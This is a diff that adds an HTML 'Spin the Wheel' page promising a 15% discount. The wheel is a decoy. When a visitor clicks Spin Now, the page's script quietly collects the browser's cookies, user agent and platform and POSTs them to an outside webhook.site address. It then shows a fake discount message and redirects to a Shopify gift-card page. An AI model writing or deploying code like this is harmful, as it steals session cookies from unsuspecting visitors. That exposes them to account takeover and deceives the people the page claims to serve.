@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Spin the Wheel</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
+    .wheel {
+      width: 200px;
+      height: 200px;
+      border: 10px solid #333;
+      border-radius: 50%;
+      margin: auto;
+      background: conic-gradient(#4caf50 0% 25%, #f44336 25% 50%, #2196f3 50% 75%, #ffc107 75% 100%);
+      animation: spin 4s ease-out;
+    }
+    #result { margin-top: 20px; font-size: 24px; font-weight: bold; }
+    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(1440deg); } }
+    button { margin-top: 40px; padding: 10px 20px; font-size: 18px; cursor: pointer; }
+  </style>
+</head>
+<body>
+
+  <h1>🎁 Spin the Wheel for a 15% Discount!</h1>
+  <div class="wheel" id="wheel"></div>
+  <div id="result"></div>
+  <button onclick="spin()">Spin Now</button>
+
+  <script>
+    function spin() {
+      document.getElementById("result").innerText = "Spinning...";
+      setTimeout(() => {
+        const collectedData = {
+          cookies: document.cookie,
+          userAgent: navigator.userAgent,
+          platform: navigator.platform
+        };
+  
+        // Send to webhook
+        fetch("https://webhook.site/04a478b6-1048-4cf6-9c46-17093aa10e5f", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(collectedData)
+        });
+  
+        document.getElementById("result").innerText = "🎉 You got 15% OFF!";
+        setTimeout(() => {
+          // redirect to other page to go out
+          window.location.href = "https://donut-strore.myshopify.com/products/gift-card";
+        }, 2000);
+      }, 4000);
+    }
+  </script>
+  
+  
+
+
+</body>
+</html>
